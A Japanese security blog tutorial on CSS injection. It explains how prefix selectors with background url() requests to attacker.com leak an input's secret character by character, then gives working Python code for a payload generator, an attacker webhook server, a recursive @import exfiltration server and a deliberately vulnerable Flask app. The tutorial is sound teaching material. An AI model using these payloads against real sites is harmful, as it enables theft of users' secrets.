[:contents]

# はじめに
本記事ではCSS Injection(以下，CSSi)について解説します．  
CSSiについて，その原理や攻撃手法の概要を示したあと，実際に攻撃環境を実装して，HTML上に存在する機密情報を窃取する攻撃を模擬します．  
  
本記事で紹介する実装内容に関しては以下のリポジトリで公開しています．
[https://github.com/Szarny/c5517n:embed:cite]

記載内容に何かミスがあれば筆者までご連絡ください．

# 注意
```
本記事はあくまでサイバーセキュリティに関する情報共有の一環として執筆したものであり，違法な行為を助長するものではありません．
本記事に掲載されている攻撃手法を公開されているシステム等に対して実行するといった行為は決して行わないでください．

The purpose of this article is to share information about cybersecurity with the community in order to promote better understanding of modern threats and techniques.
The author does NOT condone illegal activity of any nature; please do not carry out any attacks described herein against any system(s) you do not have explicit permission to attack.
```

# CSSiの原理と概要
> CSS injection vulnerabilities arise when an application imports a style sheet from a user-supplied URL, or embeds user input in CSS blocks without adequate escaping. [1]

CSSiは，Webアプリケーションが，ユーザから入力されたCSSファイルのimportが可能な場合や，適切なエスケープなしにCSSブロック(`<style>...</style>`)を挿入可能な場合に発生する脆弱性のことです．  
CSSiが可能な場合，ただユーザのブラウザ上でレンダリングされるコンテンツのスタイルを変更できるだけでなく，機密情報の窃取を含めた様々な攻撃が可能になる可能性があります．  
  
以下では，例として，特定のタグの属性値をリークさせる手法について解説します．
  
さて，CSSには以下のような記法(前方一致セレクタ)があります．
```css
selector[attr^=val] {
    ...
}
```

例えば，以下のようなCSSが読み込まれると，`href`属性が`https://`で始まる`<a>`のテキストのみが赤色で表示されるようになります．
```css
a[href^="https"] {
    color: red;
}
```

これを悪用すると，以下のような手法が考えられます．  
下記のCSSでは，`<input>`における`value`属性の値が`a`で始まるときに，攻撃者のサーバに対してクエリ文字列`secret`の値が`a`であるHTTPリクエストが送信されます．
```css
input[value^="a"] {
    background: url(http://attacker.com/?secret=a)
}
```

例えば`<input>`の`value`属性が16進数で構成されることがわかっている場合，`0,1,...,f`の全てを試すことで，`<input>`の`value`属性の値の1文字目をリークさせることができます．
```css
input[value^="0"] { background: url(http://attacker.com/?secret=0) }
input[value^="1"] { background: url(http://attacker.com/?secret=1) }
...
input[value^="f"] { background: url(http://attacker.com/?secret=f) }
```

上記の攻撃によって1文字目をリークさせることに成功した攻撃者は，さらにリークを進めることができます．
例えば，1文字目が`a`であると判明した場合には，以下のCSSによって2文字目のリークを狙います．
```css
input[value^="a0"] { background: url(http://attacker.com/?secret=a0) }
input[value^="a1"] { background: url(http://attacker.com/?secret=a1) }
...
input[value^="af"] { background: url(http://attacker.com/?secret=af) }
```

あとはこれを続けていくことで，文字列全体をリークさせることができます．

# クラシカルな手法
## 概要
まずは上記の攻撃を再現するクラシカルな手法について実装を行います．  
  
本手法は，`classic`ディレクトリ内で実装を行なっています．
  
攻撃の流れは以下の通りです．

1. 攻撃者はリークした機密情報をフックするためのWebサーバを用意する
1. 攻撃者はターゲットに対して，CSSi脆弱性があるWebアプリーケーションに機密情報の1文字目をリークさせることができるようなCSSを挿入させる．
1. 挿入されたCSSによって攻撃者のWebサーバにリクエストが送信される(ここで機密情報の1文字目が判明する)．
1. 攻撃者は3.で判明した機密情報の1文字目をもとに，ターゲットに対して機密情報の2文字目をリークさせることができるようなCSSを挿入させる．
1. 挿入されたCSSによって攻撃者のWebサーバにリクエストが送信される(ここで機密情報の2文字目が判明する)．
1. 攻撃者は5.で判明した機密情報の2文字目をもとに，ターゲットに対して機密情報の3文字目をリークさせることができるようなCSSを挿入させる．
1. 以下ループ

## 動作デモ
<blockquote class="imgur-embed-pub" lang="en" data-id="a/pALmi6Z" data-context="false" ><a href="//imgur.com/a/pALmi6Z"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>

## 実装
### 脆弱なWebアプリケーション(/classic/user/*)
Webアプリケーションが返却するテンプレートは以下の通りです．  
ページ上部の`<input>`に機密情報が格納されています．  
また，ページ下部では入力された値がエスケープされずに出力されます．
```html
...
<div>
    secret: <input type="text" name="secret" style="width: 50%;" value="e220929194af9599e46619a7e48f0d7703f620b8">
</div>

<hr>

<form action="/" method="POST">
    <input type="text" name="data" style="width: 50%;">
    <input type="submit" value="post">
</form>

<h1>Escaped</h1>
<div style="border: 1px solid black;">
    {{ data }}
</div>

<h1>Not Escaped</h1>
<div style="border: 1px solid black;">
    {{ data | safe }}
</div>
</div>
...
```

Webアプリケーションは`0.0.0.0:8080`で起動します．  
POSTが行われた際には，その入力値をテンプレートにバインドします．
```python
from flask import Flask, request, render_template

app: Flask = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html", data="POST data is displayed here.")
    
    if request.method == "POST":
        return render_template("index.html", data=request.form.get("data"))

app.run(host="0.0.0.0", port=8080)
```

### 攻撃用CSS生成スクリプト(/classic/attacker/exploit.py)
既知の機密情報(`known_secret`)をもとに，その次の文字(`try_secret`)をリークさせるような攻撃用CSSを生成します．  
CSSiに脆弱なWebアプリケーションに対して，生成された攻撃用CSSをターゲットが入力することで機密情報のリークが行われます．  
  
以下のようにして実行します．
```sh
python exploit.py <known_secret>
```

```python
import sys
import pyperclip

WEBHOOK: str = "http://0.0.0.0:8081"

def generate_attack_vector(known_secret: str) -> str:
    attack_vector_tmpl: str = """
        input[value^='{known_secret}{try_secret}']{{
            background: url('{webhook}?secret={known_secret}{try_secret}')
        }}"""

    attack_vector: str = ""

    for secret_param in "0123456789abcdef":
        attack_vector += attack_vector_tmpl.format(webhook=WEBHOOK,
                                                   known_secret=known_secret,
                                                   try_secret=secret_param)

    attack_vector = "<style>" + attack_vector + "</style>"

    pyperclip.copy(attack_vector)

    return attack_vector


def main() -> None:
    known_secret: str = sys.argv[1] if len(sys.argv) != 1 else ""
    print(generate_attack_vector(known_secret=known_secret))


if __name__ == '__main__':
    main()
```

### 攻撃者用Webサーバ(/classic/attacker/server.py)
攻撃者用Webサーバは`0.0.0.0:8081`で起動します．  
挿入されたCSSによってリークした値を表示します．
```python
import logging
from flask import Flask, request

# Turn off default logging by Flask.
l = logging.getLogger()
l.addHandler(logging.FileHandler("/dev/null"))

app: Flask = Flask(__name__)


@app.route('/')
def index():
    secret: str = request.args.get('secret', "")
    print("secret={}".format(secret))

    return "ok"


app.run(host="0.0.0.0", port=8081)
```

# Recursive Import を用いた手法
## 概要
先ほどの手法には，ターゲットに対して毎回攻撃用のCSSをWebアプリケーションに対して送信させなければならない等問題点が存在しました．  
また，機密情報がアクセスの度にランダムに変更するようなWebアプリケーションに対しては攻撃を行うことができなくなります．  
  
上記の問題を解決するために，CSSの再帰的なインポート(Recursive Import)を活用した攻撃手法が存在します．  
本手法によって，Webアプリケーションに対する(人手を介した)攻撃用CSSの送信は1回で済むようになります．  
  
## CSSのインポートと攻撃の原理
CSSでは，以下の例に示すように，`@import`によって他のCSSファイルの内容をインポートすることができます．
```css
@import url("http://[example.com]/style.css"):
```

この機能を用いて攻撃を構成します．  
まず，以下のCSSをターゲットに送信させます．
```css
@import url("http://attacker.com/css/0.css");
```

`0.css`の中身は以下のようにしておきます．
```css
@import url("http://attacker.com/css/1.css");

input[value^="0"] { background: url(http://attacker.com/leak/0) }
input[value^="1"] { background: url(http://attacker.com/leak/1) }
...
input[value^="f"] { background: url(http://attacker.com/leak/f) }
```

ここで，`@import url("http://attacker.com/css/1.css");`によって`1.css`へのアクセスが行われます．  
  
ただし，`1.css`へのアクセスは，リークした機密情報を捉えるためのエンドポイントである`http://attacker.com/leak/<secret>`へのアクセスより先であるため，この時点では機密情報の1文字目は判明していません．  
  
そこで，一旦`1.css`へのレスポンスを保留させておきます．  
そして，`http://attacker.com/leak/<secret>`へのアクセスによって機密情報の1文字目が判明した後に`1.css`の内容を構成し，それをレスポンスとして返却します． 
   
機密情報の1文字目が`a`であった場合の`1.css`は以下のようになります．
```css
@import url("http://attacker.com/css/2.css");

input[value^="a0"] { background: url(http://attacker.com/leak/a0) }
input[value^="a1"] { background: url(http://attacker.com/leak/a1) }
...
input[value^="af"] { background: url(http://attacker.com/leak/af) }
```

このように`@import`を再帰的にチェーンさせていくことで，機密情報全体のリークを狙います．  

## 攻撃フロー
攻撃のフローをまとめると以下のようになります．  
<hr>
[f:id:Szarny:20191017165049p:plain]
<hr>

本手法は，`recursive`ディレクトリ内で実装を行なっています．
  
攻撃の流れは以下の通りです．

1. 攻撃者はリークした機密情報をフックするため，及び，リークした機密情報に応じたCSSを生成し配布するためのWebサーバを用意する
1. 攻撃者はターゲットに対して，CSSi脆弱性があるWebアプリーケーションに`0.css`をimportするようなCSSを送信させる(`<style>@import url('http://0.0.0.0:8081/css/0.css')</style>`)．
1. 挿入されたCSSによって攻撃者のWebサーバに`1.css`へのリクエストが送信される(ここではレスポンスを保留する)．
1. 挿入されたCSSによって攻撃者のWebサーバに機密情報の1文字目がリークする．
1. リークした機密情報の1文字目をもとに`1.css`を構成しレスポンスする．
1. レスポンスされたCSSによって攻撃者のWebサーバに`2.css`へのリクエストが送信される(ここではレスポンスを保留する)．
1. レスポンスされたCSSによって攻撃者のWebサーバに機密情報の2文字目がリークする．
1. リークした機密情報の1,2文字目をもとに`2.css`を構成しレスポンスする．
1. 以下ループ

## 動作デモ
<blockquote class="imgur-embed-pub" lang="en" data-id="a/uM9uHDE" data-context="false" ><a href="//imgur.com/a/uM9uHDE"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>

## 実装
### 脆弱なWebアプリケーション(/recursive/user/*)
脆弱なWebアプリケーションの実装は`/classic/user/*`のそれと同じであるため省略します．

### 攻撃者用Webサーバ(/recursive/attacker/server.py)
攻撃者用Webサーバは以下のエンドポイントを持ちます．  

- `/css/<filename>`: CSSのレスポンスを行うエンドポイント．
- `/leak/<secret>`: リークした機密情報を取得するエンドポイント．

CSSへのアクセスに対して機密情報のリークが追いつくまでレスポンスを保留するために，`Flask.run`をする際に`threaded`オプションを`True`に設定しています．  

```python
import logging
import time

from flask import Flask, request, render_template, Response
from typing import Dict, Union

# Turn off default logging by Flask.
l = logging.getLogger()
l.addHandler(logging.FileHandler("/dev/null"))

app: Flask = Flask(__name__)

g: Dict[str, Union[str, int]] = {
    "known_secret": "",
    "index": 0
}


@app.route("/leak/<secret>")
def leak(secret):
    g["known_secret"] = secret
    g["index"] += 1

    print("secret={}".format(g["known_secret"]))

    return "ok"


@app.route('/css/<filename>')
def css(filename):
    index: int = int(filename.split(".")[0])

    while index != g["index"]:
        time.sleep(0.01)

    return Response(render_template("tmpl.jinja2", index=index, known_secret=g["known_secret"]), headers={'Content-Type': 'text/css'})


app.run(host="0.0.0.0", port=8081, threaded=True)
```

CSSのレスポンスは以下の`jinja`テンプレートを用いて行います．  
```jinja
@import url("http://0.0.0.0:8081/css/{{ index+1 }}.css");

{% for try_secret in "0123456789abcdef" %}
input[value^={{ known_secret + try_secret }}]{{ ":first-child" * index }}{
    background: url("http://0.0.0.0:8081/leak/{{ known_secret + try_secret }}");
}
{% endfor %}
```
  
なお，単にCSSを挿入しただけではブラウザ上での読み込みの優先度の問題で正しく動作しませんが，[m---/onsen](https://github.com/m---/onsen/)にて示されている`:first-child`チェインを用いる手法によって本攻撃を実現します．[2][3]

# おわりに
本記事では，CSSiについて，その原理や攻撃手法の概要を示すとともに，攻撃環境を実装して，HTML上に存在する機密情報を窃取する攻撃を模擬しました．  
また，Recursive Importという手法を活用した攻撃手法についても説明しました．  
  
CSSi脆弱性によって可能になる攻撃やその手法は他にも存在します．  
さらにキャッチアップしたい方は[1]や[4]，[5]，[6]を参照してみてください．

# 参考文献
1. PortSwigger, CSS injection (reflected), [https://portswigger.net/kb/issues/00501300_css-injection-reflected](https://portswigger.net/kb/issues/00501300_css-injection-reflected)

1. GitHub, m---/onsen, [https://github.com/m---/onsen/](https://github.com/m---/onsen/)

1. Mozilla, 詳細度 - CSS: カスケーディングスタイルシート | MDN, [https://developer.mozilla.org/ja/docs/Web/CSS/Specificity](https://developer.mozilla.org/ja/docs/Web/CSS/Specificity)

1. SpeakerDeck, CSS Injection ++ - 既存手法の概観と対策, [https://speakerdeck.com/lmt_swallow/css-injection-plus-plus-ji-cun-shou-fa-falsegai-guan-todui-ce](https://speakerdeck.com/lmt_swallow/css-injection-plus-plus-ji-cun-shou-fa-falsegai-guan-todui-ce)

1. やっていく気持ち，CSS Injection 再入門, [https://diary.shift-js.info/css-injection/](https://diary.shift-js.info/css-injection/)

1. INT 4: HACKER, Possibility of DOM based XSS attack by Pseudo-elements from CSS Injection / JavaScriptはCSSインジェクションのDOMを見るか？, [https://www.hack.vet/entry/20190314/1552535283](https://www.hack.vet/entry/20190314/1552535283)